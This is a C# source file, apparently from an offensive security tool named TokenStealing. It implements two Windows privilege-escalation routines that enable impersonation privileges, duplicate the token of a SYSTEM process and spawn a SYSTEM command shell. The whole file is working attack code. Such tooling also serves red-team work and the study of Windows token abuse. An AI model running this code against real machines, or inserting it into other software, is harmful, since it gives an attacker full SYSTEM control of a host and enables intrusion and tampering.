using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using TokenStealing.Interop;

namespace TokenStealing.Library
{
    internal class Modules
    {
        public static bool GetSystemBySecondaryLogon(bool fullPrivileged)
        {
            int error;
            var startupInfo = new STARTUPINFO
            {
                cb = Marshal.SizeOf(typeof(STARTUPINFO)),
                lpDesktop = @"Winsta0\Default"
            };
            var requiredPrivs = new List<string>
            {
                Win32Consts.SE_IMPERSONATE_NAME
            };
            var isImpersonated = false;
            var status = false;

            do
            {
                if (Helpers.IsSystem())
                {
                    Console.WriteLine("[!] You already have SYSTEM privileges.");
                    status = true;
                    break;
                }

                Console.WriteLine("[>] Trying to enable privileges.");

                Utilities.EnableTokenPrivileges(
                    requiredPrivs,
                    out Dictionary<string, bool> adjustedPrivs);

                if (!adjustedPrivs[Win32Consts.SE_IMPERSONATE_NAME])
                {
                    Console.WriteLine("[-] {0} is not available.", Win32Consts.SE_IMPERSONATE_NAME);
                    break;
                }
                else
                {
                    Console.WriteLine("[+] {0} is enabled successfully.", Win32Consts.SE_IMPERSONATE_NAME);
                }

                Console.WriteLine("[>] Trying to get handle from a SYSTEM process.");

                IntPtr hProcess = Utilities.GetSystemProcessHandle(
                    new List<string>(),
                    ACCESS_MASK.PROCESS_QUERY_LIMITED_INFORMATION,
                    ACCESS_MASK.TOKEN_DUPLICATE,
                    out int pid,
                    out string processName);

                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get valid handle from any SYSTEM processes.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a SYSTEM process handle (hProcess = 0x{0}).", hProcess.ToString("X"));
                    Console.WriteLine("    [*] Process ID   : {0}", pid);
                    Console.WriteLine("    [*] Process Name : {0}", processName);
                }

                Console.WriteLine("[>] Trying to open process token.");

                status = NativeMethods.OpenProcessToken(hProcess, ACCESS_MASK.TOKEN_DUPLICATE, out IntPtr hToken);
                NativeMethods.NtClose(hProcess);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to open process token.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got token from the target process (hToken = 0x{0}).", hToken.ToString("X"));
                }

                Console.WriteLine("[>] Trying to duplicate primary token.");

                status = NativeMethods.DuplicateTokenEx(
                    hToken,
                    ACCESS_MASK.MAXIMUM_ALLOWED,
                    IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous,
                    TOKEN_TYPE.TokenPrimary,
                    out IntPtr hPrimaryToken);
                NativeMethods.NtClose(hToken);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to duplicate primary token.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Duplicated token successfully (hPrimaryToken = 0x{0}).", hPrimaryToken.ToString("X"));
                }

                if (fullPrivileged)
                {
                    Console.WriteLine("[>] Trying to enable all privileges.");

                    status = Utilities.EnableAllTokenPrivileges(hPrimaryToken, out Dictionary<string, bool> availablePrivs);

                    if (!status)
                    {
                        foreach (var disabledPriv in availablePrivs)
                        {
                            if (!disabledPriv.Value)
                                Console.WriteLine("[-] Failed to enable {0}.", disabledPriv.Key);
                        }
                    }
                    else
                    {
                        Console.WriteLine("[+] All token privileges are enabled successfully.");
                    }
                }

                Console.WriteLine("[>] Trying to spawn SYSTEM shell by Secondary Logon Service.");

                status = NativeMethods.CreateProcessWithToken(
                    hPrimaryToken,
                    LOGON_FLAGS.LOGON_WITH_PROFILE,
                    null,
                    @"C:\Windows\System32\cmd.exe",
                    PROCESS_CREATION_FLAGS.NONE,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInformation);
                NativeMethods.NtClose(hPrimaryToken);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to spawn SYSTEM shell.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                }
                else
                {
                    Console.WriteLine("[+] SYSTEM shell is executed succcessfully.");
                    Console.WriteLine("    [*] Process ID   : {0}", processInformation.dwProcessId);
                    Console.WriteLine("    [*] Process Name : {0}", Process.GetProcessById(processInformation.dwProcessId).ProcessName);

                    NativeMethods.NtClose(processInformation.hThread);
                    NativeMethods.NtClose(processInformation.hProcess);
                }
            } while (false);

            if (isImpersonated)
                NativeMethods.RevertToSelf();

            Console.WriteLine("[*] Done.");

            return status;
        }


        public static bool GetSystemByTokenImpersonation(bool fullPrivileged)
        {
            int error;
            var startupInfo = new STARTUPINFO
            {
                cb = Marshal.SizeOf(typeof(STARTUPINFO)),
                lpDesktop = @"Winsta0\Default"
            };
            var requiredPrivs = new List<string>
            {
                Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME,
                Win32Consts.SE_IMPERSONATE_NAME,
                Win32Consts.SE_INCREASE_QUOTA_NAME
            };
            var isImpersonated = false;
            var status = false;

            do
            {
                if (Helpers.IsSystem())
                {
                    Console.WriteLine("[!] You already have SYSTEM privileges.");
                    status = true;
                    break;
                }

                Console.WriteLine("[>] Trying to enable privileges.");

                Utilities.EnableTokenPrivileges(
                    requiredPrivs,
                    out Dictionary<string, bool> adjustedPrivs);

                foreach (var priv in adjustedPrivs)
                {
                    if (priv.Value)
                        Console.WriteLine("[+] {0} is enabled successfully.", priv.Key);
                }

                if (!(adjustedPrivs[Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME] && adjustedPrivs[Win32Consts.SE_INCREASE_QUOTA_NAME]) &&
                    !adjustedPrivs[Win32Consts.SE_IMPERSONATE_NAME])
                {
                    Console.WriteLine("[-] You don't have sufficient privileges.");
                    break;
                }

                Console.WriteLine("[>] Trying to get handle from a SYSTEM process.");

                IntPtr hProcess = Utilities.GetSystemProcessHandle(
                    new List<string> { Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME, Win32Consts.SE_INCREASE_QUOTA_NAME },
                    ACCESS_MASK.PROCESS_QUERY_LIMITED_INFORMATION,
                    ACCESS_MASK.TOKEN_DUPLICATE,
                    out int pid,
                    out string processName);

                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get valid handle from any SYSTEM processes.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a SYSTEM process handle (hProcess = 0x{0}).", hProcess.ToString("X"));
                    Console.WriteLine("    [*] Process ID   : {0}", pid);
                    Console.WriteLine("    [*] Process Name : {0}", processName);
                }

                Console.WriteLine("[>] Trying to open process token.");

                status = NativeMethods.OpenProcessToken(hProcess, ACCESS_MASK.TOKEN_DUPLICATE, out IntPtr hToken);
                NativeMethods.NtClose(hProcess);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to open process token.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got token from the target process (hToken = 0x{0}).", hToken.ToString("X"));
                }

                if (!adjustedPrivs[Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME])
                {
                    Console.WriteLine("[*] You don't have {0}, so try impersonation at first.", Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME);
                    Console.WriteLine("[>] Trying to duplicate impersonation token.");

                    status = NativeMethods.DuplicateTokenEx(
                        hToken,
                        ACCESS_MASK.MAXIMUM_ALLOWED,
                        IntPtr.Zero,
                        SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        TOKEN_TYPE.TokenImpersonation,
                        out IntPtr hImpersonationToken);

                    if (!status)
                    {
                        error = Marshal.GetLastWin32Error();
                        Console.WriteLine("[-] Failed to duplicate impersonation token.");
                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                        NativeMethods.NtClose(hToken);
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[+] Duplicated token successfully (hImpersonationToken = 0x{0}).", hImpersonationToken.ToString("X"));
                    }

                    Console.WriteLine("[>] Trying to impersonate as SYSTEM process.");

                    status = Utilities.EnableTokenPrivileges(
                        hImpersonationToken,
                        new List<string> { Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME, Win32Consts.SE_INCREASE_QUOTA_NAME },
                        out Dictionary<string, bool> _);

                    if (!status)
                    {
                        Console.WriteLine("[-] Failed to enable {0}.", Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME);
                    }
                    else
                    {
                        status = Utilities.ImpersonateThreadToken(hImpersonationToken);

                        if (!status)
                        {
                            Console.WriteLine("[-] Failed to impoersonate as SYSTEM process.");
                        }
                        else
                        {
                            isImpersonated = true;
                            Console.WriteLine("[+] Impersonation is successful.");
                        }
                    }

                    NativeMethods.NtClose(hImpersonationToken);

                    if (!isImpersonated)
                    {
                        NativeMethods.NtClose(hToken);
                        break;
                    }
                }

                Console.WriteLine("[>] Trying to duplicate primary token.");

                status = NativeMethods.DuplicateTokenEx(
                    hToken,
                    ACCESS_MASK.MAXIMUM_ALLOWED,
                    IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous,
                    TOKEN_TYPE.TokenPrimary,
                    out IntPtr hPrimaryToken);
                NativeMethods.NtClose(hToken);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to duplicate primary token.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Duplicated token successfully (hPrimaryToken = 0x{0}).", hPrimaryToken.ToString("X"));
                }

                if (fullPrivileged)
                {
                    Console.WriteLine("[>] Trying to enable all privileges.");

                    status = Utilities.EnableAllTokenPrivileges(hPrimaryToken, out Dictionary<string, bool> availablePrivs);

                    if (!status)
                    {
                        foreach (var disabledPriv in availablePrivs)
                        {
                            if (!disabledPriv.Value)
                                Console.WriteLine("[-] Failed to enable {0}.", disabledPriv.Key);
                        }
                    }
                    else
                    {
                        Console.WriteLine("[+] All token privileges are enabled successfully.");
                    }
                }

                Console.WriteLine("[>] Trying to spawn SYSTEM shell.");

                status = NativeMethods.CreateProcessAsUser(
                    hPrimaryToken,
                    null,
                    @"C:\Windows\System32\cmd.exe",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    PROCESS_CREATION_FLAGS.NONE,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInformation);
                NativeMethods.NtClose(hPrimaryToken);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to spawn SYSTEM shell.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                }
                else
                {
                    Console.WriteLine("[+] SYSTEM shell is executed succcessfully.");

                    NativeMethods.NtWaitForSingleObject(processInformation.hThread, true, IntPtr.Zero);
                    NativeMethods.NtClose(processInformation.hThread);
                    NativeMethods.NtClose(processInformation.hProcess);
                }
            } while (false);

            if (isImpersonated)
                NativeMethods.RevertToSelf();

            Console.WriteLine("[*] Done.");

            return status;
        }
    }
}
